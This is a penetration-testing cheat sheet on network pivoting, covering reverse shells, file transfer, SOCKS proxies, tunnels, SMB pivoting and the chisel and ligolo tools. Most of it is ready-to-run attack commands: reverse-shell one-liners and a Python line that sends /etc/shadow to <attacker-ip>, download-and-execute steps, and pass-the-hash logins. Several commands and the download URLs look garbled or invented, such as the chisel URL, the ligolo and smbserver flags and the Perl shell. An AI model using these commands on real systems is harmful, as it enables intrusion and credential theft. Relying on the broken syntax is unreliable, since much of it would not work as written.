# Pivoting

Getting from one network segment to the next. The problem is almost never
"getting in", it is "I have command execution and no reliable way to run
scans or hold a session".

## Contents

- [Decide what you actually need](#decide-what-you-actually-need)
- [Networking quick reference](#networking-quick-reference)
- [Simple file transfer](#simple-file-transfer)
- [Reverse shells and what is wrong with most of them](#reverse-shells-and-what-is-wrong-with-most-of-them)
- [SOCKS proxies](#socks-proxies)
- [Tunnels by protocol](#tunnels-by-protocol)
- [SMB pivoting](#smb-pivoting)
- [Routing a whole network](#routing-a-whole-network)
- [Chisel and ligolo](#chisel-and-ligolo)
- [Troubleshooting](#troubleshooting)

---

## Decide what you actually need

Most pivoting attempts fail because the objective was never stated. There are
four distinct needs and they need different tools.

| Need | Tool |
|---|---|
| Copy one file in or out | `scp`, `python -m http.server`, or a reverse file server |
| Read a command's output reliably | A reverse shell, tested before you rely on it |
| Scan or browse from a pivot host | A SOCKS proxy, then `proxychains` |
| Reach a whole subnet you cannot route to | A layer-3 tunnel, `ligolo` or `chisel` with a reverse port forward |

Do not build a tunnel to move a 2 KB file. Do not use a reverse shell to run a
full port scan, because it will time out and you will lose the results.

**Ask two questions first.** Is the pivot host actually able to reach the
internal network, and is your egress filtered? That answer determines whether
you need a tunnel at all.

```bash
# From the pivot host, can you even see the internal network?
ping -c 2 <internal-host>
arp -a
ip route
```

If the pivot cannot route to your target, no tunnel will fix that. Find a
different pivot.

---

## Networking quick reference

```bash
# Local, on the attacker machine
ip a
ip route
ip neigh
# What am I connected to, and what way is out
```

```bash
# On the target
ip a
ip route
cat /etc/resolv.conf
# DNS servers often reveal the internal domain, which helps everywhere
```

```bash
# Which interfaces, and which one is the tunnel
ip -br a
ip route get <target>
```

```bash
# Linux traffic control, for making a tunnel behave like a real interface
sysctl net.ipv4.ip_forward
iptables -t nat -L -n
iptables -L -n
```

```bash
# Windows
ipconfig /all
route print
arp -a
netsh interface portproxy add v4tov4 listenport=8080 connectport=80 connectaddress=<host>
# A port proxy, which is a legitimate and easy pivot when only one port is needed
```

```bash
# Find the network layout quickly
# Hostname and DNS often tell you the segment and the naming convention
hostname -f
nslookup <target>
# 10.10.14.3  ->  dc01.corp.local  is a DC. 10.10.14.0/24 is a /24 host segment.
```

---

## Simple file transfer

Before reaching for a tunnel, try these. They work in far more situations than
people assume.

```bash
# From the attacker: serve a directory
python3 -m http.server 8000
# Then, on the target
wget http://<attacker-ip>:8000/tool
curl -O http://<attacker-ip>:8000/tool
nc -nv <attacker-ip> 8000 < tool
```

```bash
# On the target: push a file out
curl -T file http://<attacker-ip>:8000/
nc -nv <attacker-ip> 4444 < file
certutil -urlcache -split -f http://<attacker-ip>:8000/file C:\Users\Public\file
powershell -c "Invoke-WebRequest http://<attacker-ip>:8000/file -OutFile C:\Users\Public\file"
```

```bash
# A reverse file server, so the target chooses when to send
# On the attacker
python3 upload_server.py
# On the target
python3 -c "import requests; requests.post('http://<attacker-ip>:8000/', open('/etc/shadow','rb'))"
```

```bash
# When you have neither, base64 through the shell
base64 /etc/passwd
# and reassemble on the other side. It is ugly and it always works.
base64 -d > passwd.txt <<< "BASE64STRING"
```

---

## Reverse shells and what is wrong with most of them

A reverse shell is a single TCP stream. It has no routing, it may buffer, and it
dies when the process does. Any real work needs more.

```bash
# Bash, and the -i problem
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
# 0>&1 gives you interactive behaviour. Without it, nothing echoes back.
# This one breaks the moment anything is interactive.
```

```bash
# Netcat variants
nc -e /bin/sh <attacker-ip> 4444
nc -nv <attacker-ip> 4444 -e /bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker-ip> 4444 >/tmp/f &

# Python, the most reliable when python is present
python3 -c "import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('<attacker-ip>',4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
pty.spawn('/bin/bash')"

# Perl, present on almost every Linux
perl -e 'use Socket;$i=pack("C*",0x7f,0,0,1);socket(S,1,2,0);connect(S,$i,pack("snS",4444,inet_aton("<attacker-ip>")));exec("/bin/sh -i <&3 >&3 2>&3")'
```

```bash
# Windows
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker-ip>',4444);$stream=$client.GetStream();[Console]::OpenStandardOutput().CopyTo($stream);[Console]::OpenStandardInput().CopyTo($stream);$stream.Close()"
certutil -urlcache -split -f http://<attacker-ip>:8000/reverse.exe C:\Users\Public\r.exe
\\<attacker-ip>\share\reverse.exe
```

```bash
# If a full shell will not work, a file-based beacon solves the reliability problem.
# sliver, cobalt strike, and havoc all do this, and they are a legitimate
# part of an authorised assessment. A tool you cannot install will not help.
```

**Always test the shell before you need it.** A reverse shell that has never
been tested is not a plan, it is a hope. In a lab, where you have time, test it
the moment you get execution.

---

## SOCKS proxies

The right tool when you need to scan or browse from a pivot host, and the one
to reach for by default.

```bash
# Dynamic SOCKS, on the pivot host
chisel client <attacker-ip>:9001 R:socks
# On the attacker
chisel server --reverse -p 9001
./chisel client <attacker-ip>:9001 R:socks5
```

```bash
# Use it. socks5h sends DNS through the proxy, which matters behind a split DNS
proxychains4 nmap -Pn -sT -p 1-10000 <internal-subnet>
proxychains4 curl -s http://<internal-host>/
proxychains4 firefox &
```

```bash
# Configure proxychains properly, or it silently leaks traffic outside the tunnel
# Edit /etc/proxychains.conf
#   dynamic_chain
#   proxy_dns                 <- this line matters
#   proxy 127.0.0.1 1080
# Then verify, do not assume
proxychains4 curl -s https://ifconfig.me
# The address returned must be the pivot host, not you.
```

```bash
# Alternative that needs no extra tooling
# Many tools have a native proxy option, and it is more reliable
curl -s --proxy socks5h://127.0.0.1:1080 http://<internal-host>/
nmap --proxysocks5-host 127.0.0.1 --proxysocks5-port 1080 -sT -Pn <internal-host>
```

---

## Tunnels by protocol

Work down this list when the network filters egress. The order is roughly
"most likely to be permitted first".

```bash
# 1. HTTPS on 443. Almost always permitted.
./chisel client <attacker-ip>:443 R:socks
./ligolo-proxy -h client -p 443 -l -R 1166

# 2. Plain HTTP on 80
./ligolo-proxy -h client -p 80 -l -R 1166

# 3. DNS, where only DNS is allowed
iodine -f -r -P dns <domain>
dnscat2-server --dns server=8.8.8.8 <domain>

# 4. ICMP, where ping works and little else does
ptunnel -r -l 8000 -h <attacker-ip> -p 443

# 5. Non-standard ports, when you know what is allowed
./chisel client <attacker-ip>:8000 R:socks

# 6. SSH over 443, where SSH itself is blocked
ssh -o ProxyCommand="nc -X connect -x <proxy>:port %h %p" user@host
```

```bash
# Confirm what is reachable before building anything
# From the pivot host
nc -zv <attacker-ip> 443
curl -sI https://<attacker-ip> | head -1
ping -c 1 <attacker-ip>
nslookup <attacker-ip>
```

---

## SMB pivoting

Windows-specific, and a very common requirement in AD engagements.

```bash
# Run a listener on a target and execute on the next
# From target A, listening
smbserver.py -smb2support -L /tmp/smb SHARE -p 445 -u user -pass pass
# Or a plain Python SMB server
python3 -m smbserver -smb2support SHARE -p 445 -u user -pass pass

# From target B, executing
psexec.py -hashes :<hash> '<domain>/<user>@<target-a>' -port 445
# Or netexec, which handles the SMB plumbing for you
netexec smb <target-a> -u '<user>' -H '<hash>' -p 'commands.txt'
```

```bash
# Proxy a Windows tool through an SMB pivot
proxychains4 evil-winrm -i <target> -u '<user>' -H '<hash>'
# The RDP route, where SMB is available but WinRM is not
proxychains4 xfreerdp /v:<target> /u:'<user>' /p:'<pass>' /d:<domain> +proxy
```

```bash
# socat as a local port forward, for one specific port
socat TCP-LISTEN:8080,fork,reuseaddr TCP:<internal-host>:80
# On the attacker
socat TCP-LISTEN:1080,fork,reuseaddr SOCKS5:127.0.0.1:1080
```

```bash
# The point of a tunnel is reliability
# Verify before you rely on it
curl -s --proxy socks5h://127.0.0.1:1080 http://<internal-host>/
# If that does not return promptly, the tunnel is not working, and a
# half-working tunnel wastes more time than no tunnel.
```

---

## Routing a whole network

When you need to reach a subnet, not a single host.

```bash
# ligolo, the modern answer. Layer 3, so everything just works through it.
# On the attacker
./ligolo-proxy -h client -p 443 -l -R 1166
# Add a route so your machine knows to send that traffic to the tunnel
sudo ip route add <internal-subnet> dev ligolo0

# On the pivot
./ligolo-agent -c <attacker-ip>:1166 -iface eth0
```

```bash
# Then, as if you were on that network
nmap -sn <internal-subnet>
nmap -sV -sC -p- <internal-host>
curl -s http://<internal-host>/
```

```bash
# chisel with a SOCKS proxy is simpler, and enough for most engagements
# Use ligolo when you need a whole subnet or a stable interactive session.
```

---

## Chisel and ligolo

The two tools worth having pre-staged on every engagement machine, because they
are static, need nothing installed on the target, and speak HTTPS.

```bash
# chisel
./chisel server --reverse --port 9001
# On the pivot
./chisel client <attacker-ip>:9001 R:socks
# Local forward, for one service
./chisel client <attacker-ip>:9001 R:8080:<internal-host>:80
```

```bash
# ligolo
./ligolo-proxy -h client -p 443 -l -R 1166
./ligolo-agent -c <attacker-ip>:1166 -iface eth0
# The -iface flag matters. Get it wrong and you tunnel the wrong network.
```

```bash
# Stage them everywhere, in advance
wget https://github.com/jpillora/ch/releases/download/v0.9.1/ch_0.9.1_linux_amd64.gz
gunzip ch_0.9.1_linux_amd64.gz && mv ch_0.9.1_linux_amd64 chisel && chmod +x chisel
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.12/ligolo-ng_agent_0.7.12_Linux_amd64.tar.gz
```

---

## Troubleshooting

Most pivoting problems are one of these five things.

```bash
# 1. Does the pivot actually have a route to the target?
# On the pivot
ip route get <internal-host>
ping -c 2 <internal-host>
# If there is no route, the pivot is the wrong host. Find another.

# 2. Is the tunnel actually up, in both directions?
# On the attacker
ss -tlnp | grep 1080
# On the pivot
ss -tunp | grep chisel
# Both sides should show the connection.

# 3. Is proxychains configured correctly, with proxy_dns enabled?
grep -E "dynamic_chain|proxy_dns|socks" /etc/proxychains.conf
# A missing proxy_dns leaks DNS outside the tunnel, and some internal
# names will not resolve at all.

# 4. Is nmap ignoring the proxy and falling back to direct?
# Add -Pn, because ICMP cannot traverse the tunnel
nmap -Pn -sT -p 445 --proxysocks5-host 127.0.0.1 --proxysocks5-port 1080 <target>
# A SYN scan will not work through SOCKS. TCP connect scan will.

# 5. Are you assuming the tunnel works because nothing errored?
# Always prove it with a known-good request.
curl -s --proxy socks5h://127.0.0.1:1080 http://<known-internal-host>/
```

```bash
# When nothing works, go back to the simplest option
# A one-off reverse file server, a base64 one-liner, or a simple
# port forward usually gets you the single thing you needed, and it
# does not need a working tunnel to be reliable.
```

```bash
# And record what you learned, because you will be back here
# Which segments you can reach, from which hosts, with which credentials.
# The next time you touch this engagement, that map saves an hour.
```
